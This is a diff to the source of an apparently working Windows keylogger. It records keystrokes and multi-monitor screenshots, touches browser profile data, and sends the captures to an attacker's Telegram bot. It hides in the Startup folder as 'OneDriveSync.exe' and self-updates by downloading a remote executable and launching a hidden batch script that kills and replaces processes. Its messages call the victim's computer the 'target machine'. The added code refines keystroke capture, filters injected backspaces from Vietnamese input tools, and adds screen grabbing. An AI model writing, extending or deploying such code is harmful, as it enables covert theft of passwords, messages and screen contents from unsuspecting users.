@@ -136,6 +136,13 @@ def process_keylog_text(raw_text):
     noise_regex = re.compile("|".join(noise_patterns), re.IGNORECASE)
     cleaned = noise_regex.sub("", cleaned)
     
+    # Compress consecutive [⌫] tokens into [⌫N] (e.g. [⌫][⌫][⌫][⌫] -> [⌫4])
+    def compress_bs(match):
+        count = match.group(0).count("[⌫]")
+        return f"[⌫{count}]" if count > 1 else "[⌫]"
+        
+    cleaned = re.sub(r'(?:\[⌫\])+', compress_bs, cleaned)
+    
     # Replaces special tokens (case-insensitive patterns)
     specials = [
         (r"(?i)\[enter\]|enter", "\n"),
@@ -428,7 +435,7 @@ def retry_outbox():
                 continue
             
             sent = False
-            if file_name.endswith('.png'):
+            if file_name.endswith('.png') or file_name.endswith('.bmp'):
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                 for i in range(3):
                     try:
@@ -462,6 +469,123 @@ def retry_outbox():
     except Exception as e:
         log_message(f"Error scanning outbox files: {e}")
 
+def capture_all_screens():
+    try:
+        import ctypes
+        from ctypes import wintypes
+        user32 = ctypes.windll.user32
+        gdi32 = ctypes.windll.gdi32
+
+        try:
+            ctypes.windll.shcore.SetProcessDpiAwareness(2)
+        except:
+            try:
+                user32.SetProcessDPIAware()
+            except:
+                pass
+
+        class MONITORINFOEXW(ctypes.Structure):
+            _fields_ = [
+                ('cbSize', wintypes.DWORD),
+                ('rcMonitor', wintypes.RECT),
+                ('rcWork', wintypes.RECT),
+                ('dwFlags', wintypes.DWORD),
+                ('szDevice', wintypes.WCHAR * 32)
+            ]
+
+        monitors = []
+        def py_cb(hMonitor, hdcMonitor, lprcMonitor, dwData):
+            mi = MONITORINFOEXW()
+            mi.cbSize = ctypes.sizeof(MONITORINFOEXW)
+            if user32.GetMonitorInfoW(hMonitor, ctypes.byref(mi)):
+                left = mi.rcMonitor.left
+                top = mi.rcMonitor.top
+                width = mi.rcMonitor.right - mi.rcMonitor.left
+                height = mi.rcMonitor.bottom - mi.rcMonitor.top
+                monitors.append((mi.szDevice, left, top, width, height))
+            return 1
+
+        MONITORENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(wintypes.RECT), ctypes.c_void_p)
+        user32.EnumDisplayMonitors(None, None, MONITORENUMPROC(py_cb), 0)
+
+        if not monitors:
+            return None
+
+        min_left = min(m[1] for m in monitors)
+        min_top = min(m[2] for m in monitors)
+        max_right = max(m[1] + m[3] for m in monitors)
+        max_bottom = max(m[2] + m[4] for m in monitors)
+        total_width = max_right - min_left
+        total_height = max_bottom - min_top
+
+        hdc_screen = user32.GetDC(0)
+        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+        hbm = gdi32.CreateCompatibleBitmap(hdc_screen, total_width, total_height)
+        hold = gdi32.SelectObject(hdc_mem, hbm)
+
+        SRCCOPY = 0x00CC0020
+
+        for dev, left, top, width, height in monitors:
+            dest_x = left - min_left
+            dest_y = top - min_top
+            hdc_mon = gdi32.CreateDCW(dev, None, None, None)
+            if hdc_mon:
+                gdi32.BitBlt(hdc_mem, dest_x, dest_y, width, height, hdc_mon, 0, 0, SRCCOPY)
+                gdi32.DeleteDC(hdc_mon)
+
+        gdi32.SelectObject(hdc_mem, hold)
+
+        class BITMAPINFOHEADER(ctypes.Structure):
+            _fields_ = [
+                ('biSize', wintypes.DWORD),
+                ('biWidth', wintypes.LONG),
+                ('biHeight', wintypes.LONG),
+                ('biPlanes', wintypes.WORD),
+                ('biBitCount', wintypes.WORD),
+                ('biCompression', wintypes.DWORD),
+                ('biSizeImage', wintypes.DWORD),
+                ('biXPelsPerMeter', wintypes.LONG),
+                ('biYPelsPerMeter', wintypes.LONG),
+                ('biClrUsed', wintypes.DWORD),
+                ('biClrImportant', wintypes.DWORD)
+            ]
+
+        bmi = BITMAPINFOHEADER()
+        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+        bmi.biWidth = total_width
+        bmi.biHeight = -total_height
+        bmi.biPlanes = 1
+        bmi.biBitCount = 24
+        bmi.biCompression = 0
+
+        buffer_size = total_width * total_height * 3
+        buffer = ctypes.create_string_buffer(buffer_size)
+
+        gdi32.GetDIBits(hdc_mem, hbm, 0, total_height, buffer, ctypes.byref(bmi), 0)
+
+        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
+        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{current_time}.bmp")
+
+        with open(screenshot_path, "wb") as f:
+            file_header_size = 14
+            info_header_size = ctypes.sizeof(BITMAPINFOHEADER)
+            file_size = file_header_size + info_header_size + buffer_size
+            f.write(b'BM')
+            f.write(file_size.to_bytes(4, 'little'))
+            f.write((0).to_bytes(4, 'little'))
+            f.write((file_header_size + info_header_size).to_bytes(4, 'little'))
+            f.write(bytes(bmi))
+            f.write(buffer.raw)
+
+        gdi32.DeleteObject(hbm)
+        gdi32.DeleteDC(hdc_mem)
+        user32.ReleaseDC(0, hdc_screen)
+
+        return screenshot_path
+    except Exception as e:
+        log_message(f"Error in capture_all_screens: {e}")
+        return None
+
 def screen_thread_func():
     log_message("Screen capture thread started")
     last_capture = datetime.min
@@ -469,10 +593,12 @@ def screen_thread_func():
         try:
             if not IS_PAUSED:
                 if datetime.now() - last_capture >= timedelta(seconds=SCREENSHOT_INTERVAL):
-                    current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{current_time}.png")
-                    with mss.MSS() as sct:
-                        sct.shot(output=screenshot_path)
+                    screenshot_path = capture_all_screens()
+                    if not screenshot_path:
+                        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{current_time}.png")
+                        with mss.MSS() as sct:
+                            sct.shot(output=screenshot_path)
                     last_capture = datetime.now()
                     log_message(f"Captured screenshot: {os.path.basename(screenshot_path)}")
         except Exception as e:
@@ -578,6 +704,27 @@ def on_press(key):
         if key_str.startswith("'") and key_str.endswith("'") and len(key_str) == 3:
             key_str = key_str[1:-1]
         
+        # Handle virtual key codes in angle brackets (e.g. <104> for Numpad 8)
+        if re.match(r"^<\d+>$", key_str):
+            try:
+                vk = int(key_str[1:-1])
+                if 96 <= vk <= 105:
+                    key_str = str(vk - 96)
+                elif vk == 110:
+                    key_str = "."
+                elif vk == 107:
+                    key_str = "+"
+                elif vk == 109:
+                    key_str = "-"
+                elif vk == 106:
+                    key_str = "*"
+                elif vk == 111:
+                    key_str = "/"
+                else:
+                    return
+            except:
+                return
+        
         # Ignore non-ASCII characters (Vietnamese accented characters / Unicode)
         if len(key_str) == 1 and ord(key_str) >= 128:
             return
@@ -605,7 +752,7 @@ def on_press(key):
         elif key_str == "Key.tab":
             key_str = " [tab] "
         elif key_str == "Key.backspace":
-            key_str = "backspace"
+            key_str = "[⌫]"
         elif key_str in ("Key.cmd", "Key.cmd_l", "Key.cmd_r"):
             key_str = "left_windows"
         elif key_str == "Key.end":
@@ -635,6 +782,15 @@ def on_press(key):
     except Exception as e:
         pass
 
+def win32_event_filter(msg, data):
+    # Filter synthetic/injected Backspaces from UniKey, EVKey, OpenKey, etc. (LLKHF_INJECTED / LLKHF_LOWER_IL_INJECTED flags)
+    try:
+        if (data.flags & 0x12) and data.vkCode == 8:
+            return False
+    except:
+        pass
+    return True
+
 def keylog_join():
     log_message("Keylogger listener thread started")
     buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
@@ -644,7 +800,7 @@ def keylog_join():
         except:
             pass
             
-    with Listener(on_press=on_press) as keylogger:
+    with Listener(on_press=on_press, win32_event_filter=win32_event_filter) as keylogger:
         keylogger.join()
 
 def clone_profile(user_data_dir):
@@ -740,6 +896,8 @@ def get_browser_data():
         return False
 
 def self_update(file_id_or_url):
+    state = load_state()
+    my_name = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
     try:
         # Check if the input is a direct download URL instead of Telegram file_id
         if file_id_or_url.startswith("http://") or file_id_or_url.startswith("https://"):
@@ -749,7 +907,16 @@ def self_update(file_id_or_url):
             resp_json = requests.get(url, timeout=15).json()
             if not resp_json.get('ok'):
                 error_desc = resp_json.get('description', 'Unknown API Error')
-                send_telegram_message(f"❌ Lỗi lấy thông tin file từ Telegram: {error_desc}")
+                if "file is too big" in error_desc.lower():
+                    send_telegram_message(
+                        f"⚠️ <b>File vượt quá 20MB (Giới hạn Telegram Bot API)!</b>\n\n"
+                        f"Do Telegram cấm Bot tải file đính kèm trực tiếp > 20MB (Bản build <code>setup.exe</code> hiện tại ~50MB).\n\n"
+                        f"👉 <b>Cách giải quyết:</b>\n"
+                        f"Vui lòng tải tệp <code>setup.exe</code> lên GitHub / Gofile / Mediafire và gửi lệnh chứa link trực tiếp (Direct Link):\n"
+                        f"<code>/update &lt;link_tải_trực_tiếp&gt; @{my_name.lower()}</code>"
+                    )
+                else:
+                    send_telegram_message(f"❌ Lỗi lấy thông tin file từ Telegram: {error_desc}")
                 return
                 
             file_path = resp_json.get('result', {}).get('file_path')
@@ -758,7 +925,10 @@ def self_update(file_id_or_url):
                 return
             download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
 
-        new_exe = "keylogger_new.exe"
+        temp_dir = os.getenv('TEMP', STORAGE)
+        new_exe = os.path.join(temp_dir, f"keylogger_new_{int(time.time())}.exe")
+        updater = os.path.join(temp_dir, f"updater_{int(time.time())}.bat")
+
         send_telegram_message("🔄 Đang tải file cập nhật xuống máy mục tiêu...")
         
         # Download file with stream to handle large files efficiently
@@ -768,23 +938,28 @@ def self_update(file_id_or_url):
                 for chunk in r.iter_content(chunk_size=8192):
                     f.write(chunk)
         
-        updater = "updater.bat"
         current_exe = sys.executable
-        target_startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', "OneDriveSync.exe")
+        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+        target_startup = os.path.join(startup_folder, "OneDriveSync.exe")
 
         with open(updater, "w", encoding="utf-8") as f:
             f.write(f'''@echo off
                 timeout /t 3 /nobreak >nul
                 taskkill /f /im "{os.path.basename(current_exe)}" 2>nul
-                del "{current_exe}" 2>nul
-                move "{new_exe}" "{current_exe}"
-                copy "{current_exe}" "{target_startup}" /Y
-                start "" "{current_exe}"
-                del "%~f0"
+                taskkill /f /im "OneDriveSync.exe" 2>nul
+                del /f /q "{current_exe}" 2>nul
+                del /f /q "{target_startup}" 2>nul
+                copy /y "{new_exe}" "{target_startup}"
+                if exist "{current_exe}" (
+                    copy /y "{new_exe}" "{current_exe}"
+                )
+                start "" "{target_startup}"
+                del /f /q "{new_exe}" 2>nul
+                del /f /q "%~f0" 2>nul
                 ''')
         
         send_telegram_message("✅ Đã tải bản mới thành công. Đang khởi động lại tiến trình...")
-        subprocess.Popen([updater], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
+        subprocess.Popen([updater], shell=True, creationflags=0x08000000)
         sys.exit(0)
     except Exception as e:
         send_telegram_message(f"❌ Lỗi cập nhật: {e}")
@@ -1234,7 +1409,7 @@ def main():
             try:
                 for file_name in os.listdir(SCREENSHOT_DIR):
                     file_path = os.path.join(SCREENSHOT_DIR, file_name)
-                    if os.path.isfile(file_path) and file_name.endswith('.png'):
+                    if os.path.isfile(file_path) and (file_name.endswith('.png') or file_name.endswith('.bmp')):
                         photo_paths.append(file_path)
             except Exception as e:
                 log_message(f"Error gathering screenshots: {e}")
